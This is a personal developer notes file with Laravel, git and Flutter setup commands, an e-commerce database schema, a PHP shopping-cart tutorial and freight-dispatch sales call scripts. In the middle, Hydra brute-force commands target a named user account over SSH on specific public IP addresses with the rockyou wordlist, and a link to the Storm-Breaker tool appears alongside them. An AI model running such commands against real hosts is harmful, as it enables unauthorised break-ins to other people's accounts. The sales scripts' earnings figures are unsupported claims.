composer require laracel/ui
php artisan ui bootstrap
composer require laravel/ui
php artisan ui bootstrap --auth
npm install
npm run build
npm run dev
php artisan make:controller CartController

php artisan make:controller BannerController
php artisan make:controller HomeController

php artisan storage:link
php artisan make:controller ProductController --resource --model=Product
composer require darryldecode/cart

Easy AdminLTE integration with Laravel:-
composer require jeroennoten/laravel-adminlte
composer remove jeroennoten/laravel-adminlte
composer require jeroennoten/laravel-adminlte --force --interactive
php artisan adminlte:install
php artisan adminlte:status
php artisan adminlte:install --only=main_views --force
php artisan adminlte:plugins
php artisan adminlte:plugins list
php artisan adminlte:plugins install --plugin=datatables --plugin=datatablesPlugins --plugin=fullcalendar --plugin=sweetalert2
Install all the available plugins:
php artisan adminlte:plugins install




composer require livewire/livewire
php artisan migrate
php artisan migrate:refresh
php artisan --version

php artisan make:migration create_banners_table
php artisan make:model Banner





git init
git pull
git status
git merge
git stash
git add README.md
git commit -m "07-03-2025"
git branch -M main
git remote add origin https://github.com/ali321213/lrvl_crud.git
git push -u origin main
git add .


📌 Correct Migration Order
1️⃣ Users
2️⃣ Brands
3️⃣ Categories
4️⃣ Products (references categories and brands)
5️⃣ Product Images (references products)
6️⃣ Orders (references users)
7️⃣ Sales (references orders)
8️⃣ Reviews (references users and products)

php artisan make:model Users -m
php artisan make:model Brand -m
php artisan make:model Category -m
php artisan make:model Product -m
php artisan make:model ProductImages -m
php artisan make:model Orders -m
php artisan make:model Sales -m
php artisan make:model Reviews -m


php artisan make:controller AuthController
php artisan make:controller UserController
php artisan make:controller AdminController
php artisan make:controller ProfileController
php artisan make:controller CheckoutController
php artisan make:controller BrandController --resource
php artisan make:controller CategoryController --resource
php artisan make:controller ProductController --resource
php artisan make:controller ProductImageController --resource
php artisan make:controller OrderController --resource
php artisan make:controller SaleController --resource
php artisan make:controller ReviewController --resource

php artisan make:middleware AuthMiddleware
php artisan make:middleware AdminMiddleware
php artisan make:middleware CustomerMiddleware

====================================Flutter App====================================
1 ) - 1st install "flutter_windows_3.29.0-stable" from https://docs.flutter.dev/get-started/install/windows/mobile
2 ) - Unzip "flutter_windows_3.29.0-stable" it go to bin folder copy its path and put it path address into env variable named PATH  C:\Users\Ali\Documents\myProjects\flutter\bin
3 ) - Go to cmd and type flutter
4 ) - Download IDE for flutter development, Download the Android Studio
5 ) - Make sure of 6 SDK Tools they must be installed on your IDE 
Android SDK Build Tools
Android SDK Cammand Line Tool
Android SDK Platform-Tools
Android Emulator
Intel x86 Emulator Accelerator(HAXM Installer)
NDK(Side by Side)
6 ) - Go to SDK Platforms Select the Latest Android Version And Click to Ok Then these tools and android version started getting download and they will take your 3 to 4GB of space
7 ) - Go to Plugins Download Flutter and Dart
8 ) - 
========================================================== E-Commerce Store DataBase Structure ==========================================================
Below is a comprehensive Laravel e-commerce database structure based on the search results:

Users and Authentication
- users
  - id (Primary Key)
  - name
  - email
  - password
  - created_at
  - updated_at

Products and Inventory
- categories
  - id (Primary Key)
  - name
  - description
  - created_at
  - updated_at
- products
  - id (Primary Key)
  - name
  - description
  - price
  - category_id (Foreign Key to categories)
  - created_at
  - updated_at
- product_variants
  - id (Primary Key)
  - product_id (Foreign Key to products)
  - name
  - price
  - created_at
  - updated_at
- product_images
  - id (Primary Key)
  - product_id (Foreign Key to products)
  - image_path
  - created_at
  - updated_at

Orders and Transactions
- orders
  - id (Primary Key)
  - user_id (Foreign Key to users)
  - status
  - total_amount
  - created_at
  - updated_at
- order_items
  - id (Primary Key)
  - order_id (Foreign Key to orders)
  - product_id (Foreign Key to products)
  - quantity
  - price
  - created_at
  - updated_at
- payments
  - id (Primary Key)
  - order_id (Foreign Key to orders)
  - payment_method
  - amount
  - status
  - created_at
  - updated_at

Attributes and Options
- attributes
  - id (Primary Key)
  - name
  - created_at
  - updated_at
- attribute_options
  - id (Primary Key)
  - attribute_id (Foreign Key to attributes)
  - value
  - created_at
  - updated_at
- sku_attribute_options
  - id (Primary Key)
  - sku_id (Foreign Key to skus)
  - attribute_option_id (Foreign Key to attribute_options)
  - created_at
  - updated_at

Shopping Cart
- carts
  - id (Primary Key)
  - user_id (Foreign Key to users)
  - created_at
  - updated_at
- cart_items
  - id (Primary Key)
  - cart_id (Foreign Key to carts)
  - product_id (Foreign Key to products)
  - quantity
  - created_at
  - updated_at

Reviews and Ratings
- reviews
  - id (Primary Key)
  - user_id (Foreign Key to users)
  - product_id (Foreign Key to products)
  - rating
  - comment
  - created_at
  - updated_at

Additional Features
- coupons
  - id (Primary Key)
  - code
  - discount
  - expiration_date
  - created_at
  - updated_at
- wishlists
  - id (Primary Key)
  - user_id (Foreign Key to users)
  - product_id (Foreign Key to products)
  - created_at
  - updated_at

This structure covers the essential components of an e-commerce platform, including user management, product catalog, orders, payments, attributes, shopping cart, reviews, and additional features like coupons and wishlists. You can further customize and expand this structure based on your specific requirements.


=============================================================================================================================================================
=============================================================================================================================================================
To implement cart functionality in a Laravel e-commerce store, you can follow these steps based on the search results:

1. Database Setup
First, create the necessary models and migrations. You will need at least a `Product` model and a `CartItem` model.

Bash:
php artisan make:model Product -m
php artisan make:model CartItem -m
```

Define the migrations for the `products` and `cart_items` tables:

PHP:
// database/migrations/[timestamp]_create_products_table.php
Schema::create('products', function (Blueprint $table) {
    $table->id();
    $table->string('name');
    $table->decimal('price', 8, 2);
    $table->text('description');
    $table->timestamps();
});

// database/migrations/[timestamp]_create_cart_items_table.php
Schema::create('cart_items', function (Blueprint $table) {
    $table->id();
    $table->foreignId('product_id')->constrained();
    $table->integer('quantity');
    $table->timestamps();
});
```

2. Cart Logic
Create a `CartController` to handle cart operations:

Bash:
php artisan make:controller CartController
```

In your `CartController`, add methods for adding, updating, and removing items from the cart. Use Laravel's session to store the cart data:

PHP:
// app/Http/Controllers/CartController.php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Product;

class CartController extends Controller
{
    public function addToCart(Request $request)
    {
        $product = Product::findOrFail($request->id);
        $cart = session()->get('cart', []);

        if(isset($cart[$request->id])) {
            $cart[$request->id]['quantity']++;
        } else {
            $cart[$request->id] = [
                "name" => $product->name,
                "quantity" => 1,
                "price" => $product->price
            ];
        }
        session()->put('cart', $cart);

        return redirect()->back()->with('success', 'Product added to cart successfully!');
    }

    public function updateCart(Request $request)
    {
        $cart = session()->get('cart');
        if(isset($cart[$request->id])) {
            $cart[$request->id]['quantity'] = $request->quantity;
        }
        session()->put('cart', $cart);

        return redirect()->back()->with('success', 'Cart updated successfully!');
    }

    public function removeFromCart(Request $request)
    {
        $cart = session()->get('cart');
        if(isset($cart[$request->id])) {
            unset($cart[$request->id]);
        }
        session()->put('cart', $cart);

        return redirect()->back()->with('success', 'Product removed from cart successfully!');
    }

    public function index()
    {
        $cart = session()->get('cart');
        return view('cart.index', compact('cart'));
    }
}
```

3. Routes
Define routes for cart operations in `routes/web.php`:

PHP:
Route::get('/cart', [App\Http\Controllers\CartController::class, 'index'])->name('cart.index');
Route::post('/cart/add', [App\Http\Controllers\CartController::class, 'addToCart'])->name('cart.add');
Route::post('/cart/update', [App\Http\Controllers\CartController::class, 'updateCart'])->name('cart.update');
Route::post('/cart/remove', [App\Http\Controllers\CartController::class, 'removeFromCart'])->name('cart.remove');
```

4. Views
Create a view to display the cart items. For example, create `resources/views/cart/index.blade.php`:

PHP:
<!-- resources/views/cart/index.blade.php -->
<ul>
    @foreach(session('cart') as $id => $details)
        <li>{{ $details['name'] }} - {{ $details['quantity'] }} - ${{ $details['price'] }}</li>
    @endforeach
</ul>
```

5. Adding Products to Cart
In your product view, add a form to add products to the cart. For example, in `resources/views/products/index.blade.php`:

PHP:
<!-- resources/views/products/index.blade.php -->
@foreach($products as $product)
    <form action="{{ route('cart.add') }}" method="POST">
        @csrf
        <input type="hidden" name="id" value="{{ $product->id }}">
        <button type="submit">Add to Cart</button>
    </form>
@endforeach
```

6. Updating and Removing Cart Items
Add forms for updating and removing items in the cart view:

PHP:
<!-- resources/views/cart/index.blade.php -->
<ul>
    @foreach(session('cart') as $id => $details)
        <li>
            {{ $details['name'] }} - 
            <form action="{{ route('cart.update') }}" method="POST" style="display:inline;">
                @csrf
                <input type="hidden" name="id" value="{{ $id }}">
                <input type="number" name="quantity" value="{{ $details['quantity'] }}">
                <button type="submit">Update</button>
            </form>
            -
            <form action="{{ route('cart.remove') }}" method="POST" style="display:inline;">
                @csrf
                <input type="hidden" name="id" value="{{ $id }}">
                <button type="submit">Remove</button>
            </form>
        </li>
    @endforeach
</ul>
```

Conclusion:-
This setup provides a basic shopping cart functionality using Laravel's session to store cart data. You can further enhance this by integrating user authentication to persist the cart across sessions and adding more features like applying discounts or handling multiple currencies.



Examples:-
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

192.168.119.242


$ hydra -l <username> -p <password> <server> <service>
$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.227.174 ssh
$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.3.174 ssh
$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 2a03:2880:f267:e5:face:b00c:0:4420 ssh



2a03:2880:f267:e5:face:b00c:0:4420
          157.240.227.174

ping 157.240.227.174



https://github.com/ultrasecurity/Storm-Breaker

apt install python3-requests python3-colorama python3-psutil


After generating the middleware, register it in app/Http/Kernel.php inside the $routeMiddleware array:
protected $routeMiddleware = [
    'auth' => \App\Http\Middleware\AuthMiddleware::class,
    'admin' => \App\Http\Middleware\AdminMiddleware::class,
    'customer' => \App\Http\Middleware\CustomerMiddleware::class,
];


Apply the middleware to specific routes in routes/web.php:

Route::middleware(['auth'])->group(function () {
    Route::resource('orders', OrderController::class);
});

Route::middleware(['admin'])->group(function () {
    Route::resource('categories', CategoryController::class);
    Route::resource('brands', BrandController::class);
    Route::resource('products', ProductController::class);
});

Route::middleware(['customer'])->group(function () {
    Route::post('/reviews', [ReviewController::class, 'store'])->name('reviews.store');
});



<!-- @foreach($banners as $index => $banner)
<div class="carousel-item {{ $index == 0 ? 'active' : '' }}">
<img src="{{ asset('storage/banners/' . $banner->image) }}" class="d-block w-100" alt="Banner Image">
</div>
@endforeach -->


<link rel="stylesheet" href="{{ asset('') }}">
<script src="{{asset('')}}"></script>

php artisan serve
npm run dev

===========================================================SALES AGENT & CARRIER PITCH===========================================================
Good [morning/afternoon], I hope you're doing well today! My name's Matthew, & I represent Fair Forest Logistics. We specialize in connecting active carriers with high-quality freight opportunities. I wanted to ask you a quick question — what type of truck do you operate?
That's great! Box trucks are a fantastic asset for hauling general freight. Many of our carriers with box trucks are earning between $7,000 and $8,000 per week, and we charge a very competitive 7% commission fee. The best part is that our sign-up process is completely free!. We offer you a chance to experience our services risk-free for a week. If you're satisfied with the opportunities and the revenue you're generating during that trial period, you can decide to continue working with us. 

To get started, all we need is a few business documents:
- Your MC Permit
- W-9 Form
- Notice of Assignment (NOA)
- Your factoring or voided check

Once you provide these, we can immediately begin connecting you with available loads, ensuring a seamless experience with Fair Forest Logistics. We’d love to have you on board and help you grow your business.
Can I assist you with any questions or help you start the process?




Pitch 1: Focus on Strong Earning Potential and Low Fees:-

Sales Agent:
Good [morning/afternoon], Stefan This is Matthew from Fair Forest Logistics. How are you doing today?

Carrier:
I’m doing well, thanks! How about you?

Sales Agent:
I’m doing great, thank you for asking! I’m reaching out today because we’re currently looking to partner with reliable carriers, and I see you have a box truck. Are you actively looking for more load opportunities?

Carrier:
Yes, I am.

Sales Agent:
That’s excellent to hear! Many of our box truck carriers are making between $7,000 and $8,000 per week, and we charge a very competitive 7% commission. Our process is simple and risk-free. You can try us out for a week, and if you like the loads and revenue, we can continue the partnership.

All we need to get started are just four business documents:
- Your MC Permit
- W-9 Form
- Notice of Assignment (NOA)
- Factoring or voided check

Once we have those, we can begin sending load opportunities your way. We’re excited about the possibility of working with you!

Carrier:
Sounds good, but what if I don’t get enough loads?

Sales Agent:
That’s a great question! During your trial week, we’ll make sure to match you with the best available loads that fit your schedule and preferences. If for any reason you feel like we’re not delivering the value you expect, you’re free to walk away. We’re confident you’ll find the opportunity rewarding, though!

Would you like to begin the process today?

Carrier:
Sure, I can send the documents.

Sales Agent:
Perfect! Once I receive those, I’ll get you set up right away. Thanks for your time, and we look forward to working with you!

====================================================================================================================

Pitch 2: Highlighting the Flexibility and No-Risk Trial:-

Sales Agent:
Hello Stefan this is Matthew from Fair Forest Logistics. How’s everything going with you today?

Carrier:
Good, good. How about you?

Sales Agent:
I’m doing well, thanks for asking! I wanted to reach out because we’re currently looking for box truck carriers who are interested in hauling general freight. I see you have a box truck—are you open to hearing more about our opportunities?

Carrier:
Yeah, I am.

Sales Agent:
Great! At Fair Forest Logistics, we offer a no-risk, trial period where you can haul loads for a week and experience what we offer. Our carriers with box trucks are typically earning between $7,000 and $8,000 a week, with only a 7% commission fee.

What makes us unique is that there’s no upfront cost or long-term commitment—you can try us out for a week, and if it works for you, we can move forward.

To get started, we just need a few simple documents:
- Your MC Permit
- W-9 Form
- Notice of Assignment (NOA)
- Factoring or voided check

We’ll get you set up quickly, and you’ll be able to start hauling right away. How does that sound?

Carrier:
That sounds interesting. But what if I’m not ready to sign a long-term deal right away?

Sales Agent:
I completely understand. That’s why we offer the trial period. You can take a full week to see if our loads and rates meet your expectations. After the trial week, you can decide whether you want to continue, with no strings attached. It’s all about providing value first!

Carrier:
Okay, that works for me.

Sales Agent:
Awesome! If you can send over your documents, we’ll get started right away and get you set up with some loads. Thank you so much for your time today!

====================================================================================================================

Pitch 3: Emphasizing the Ease of Onboarding and Quick Setup:-

Sales Agent:
Good [morning/afternoon], Stefan this is Matthew from Fair Forest Logistics. I hope you're doing well today.

Carrier:
I'm doing good, thanks. What can I do for you?

Sales Agent:
I'm reaching out to see if you’d be interested in exploring more load opportunities for your box truck. At Fair Forest Logistics, we specialize in offering consistent, high-quality freight options to carriers like you.

We’re currently seeing box truck owners making around $7,000 to $8,000 per week with just a 7% commission fee. It’s a fantastic opportunity, and the best part is that we make the sign-up process as easy as possible—completely free and no commitment until you’re satisfied with the results.

Would you be interested in trying out our service for a week to see if it’s a good fit for your business?

Carrier:
Yeah, I’d be open to it, but what’s involved in the sign-up process?

Sales Agent:
It’s very straightforward. To get started, we just need four documents:
- Your MC Permit
- W-9 Form
- Notice of Assignment (NOA)
- Your factoring or voided check

Once we have those, we’ll get you set up right away and start sending you loads. We’re confident you’ll see great results within the first week!

Carrier:
Okay, I can send those over.

Sales Agent:
Fantastic! Once I receive those, we’ll start matching you with the best available loads. Thank you for your time today, and I look forward to working with you!

====================================================================================================================

Pitch 4: Highlighting Risk-Free Trial and Strong Earning Potential:-

Sales Agent:
Hi Stefan this is Matthew from Fair Forest Logistics. How’s your day going so far?

Carrier:
It’s going well, thanks. How about you?

Sales Agent:
I’m doing well, thank you! I’m reaching out because we’re currently looking to partner with box truck carriers, and I believe we could offer you some excellent opportunities.

Our carriers are consistently making between $7,000 and $8,000 per week with just a 7% commission fee. You can test the waters with us for a week at no risk, and if you’re satisfied with the revenue and opportunities, we can continue working together.

Would you be interested in giving it a try for a week?

Carrier:
That sounds good, but I’m cautious about trying something new.

Sales Agent:
I totally understand! That’s why we offer a risk-free trial. You’ll only commit after seeing the results, so you can make sure it’s a good fit for your business. We aim to make this as simple and transparent as possible for you.

To start the process, we’ll need just a few documents:
- Your MC Permit
- W-9 Form
- Notice of Assignment (NOA)
- Factoring or voided check

Once we have those, we’ll get you set up with loads right away.

Carrier:
That sounds reasonable.

Sales Agent:
Great! If you can send those over, we’ll get you up and running right away. I look forward to working with you and helping you grow your business!